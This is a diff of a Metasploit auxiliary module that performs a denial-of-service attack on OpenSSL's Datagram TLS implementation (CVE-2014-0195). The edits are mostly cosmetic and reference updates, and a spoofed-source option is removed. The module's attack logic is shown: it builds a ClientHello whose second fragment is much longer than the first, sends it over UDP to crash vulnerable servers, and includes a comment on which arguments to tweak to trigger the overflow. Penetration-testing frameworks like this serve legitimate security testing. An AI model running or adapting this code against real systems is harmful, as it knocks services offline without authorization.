@@ -8,36 +8,36 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Auxiliary::Dos
-#  include Msf::Exploit::Capture
   include Exploit::Remote::Udp
 
   def initialize(info = {})
     super(update_info(info,
       'Name'		=> 'OpenSSL DTLS Fragment Buffer Overflow DoS',
       'Description'	=> %q{
-          This module performs a Denial of Service Attack against Datagram TLS in
-          OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h.
-          This occurs when a DTLS ClientHello message has multiple fragments and the
-          fragment lengths of later fragments are larger than that of the first, a
-          buffer overflow occurs, causing a DoS.
+        This module performs a Denial of Service Attack against Datagram TLS in
+        OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h.
+        This occurs when a DTLS ClientHello message has multiple fragments and the
+        fragment lengths of later fragments are larger than that of the first, a
+        buffer overflow occurs, causing a DoS.
       },
-      'Author'	=> [
-            'Jon Hart <jon_hart[at]rapid7.com>', #original code
-            ],
+      'Author'	=>
+        [
+          'Jon Hart <jon_hart[at]rapid7.com>', #original code
+        ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
-          [ 'CVE', '2014-0195' ],
+          ['CVE', '2014-0195'],
+          ['ZDI', '14-173'],
+          ['BID', '67900']
         ],
       'DisclosureDate' => 'Jun 05 2014'))
 
     register_options([
       Opt::RPORT(4433),
-      OptInt.new('VERSION', [true,  "SSl/TLS version", 0xFEFF]),
-      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
+      OptInt.new('VERSION', [true,  "SSl/TLS version", 0xFEFF])
     ], self.class)
 
-    deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')
   end
 
   def build_tls_fragment(type, length, seq, frag_offset, frag_length, frag_body=nil)
@@ -69,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
     fragments = build_tls_fragment(1, 2, 0, 0, 1, 'C')
     # add a large fragment where the length is significantly larger than that of the first
     # TODO: you'll need to tweak the 2nd, 5th and 6th arguments to trigger the condition in some situations
-    fragments << build_tls_fragment(1, 1234, 0, 0, 123, 'A' * 1234)
+    fragments << build_tls_fragment(1, 1234, 0, 0, 123, Rex::Text.rand_text_alpha(1234))
     message = build_tls_message(22, datastore['VERSION'], 0, 0, fragments)
     connect_udp
     print_status("Sending fragmented DTLS client hello packet to #{rhost}:#{rport}")
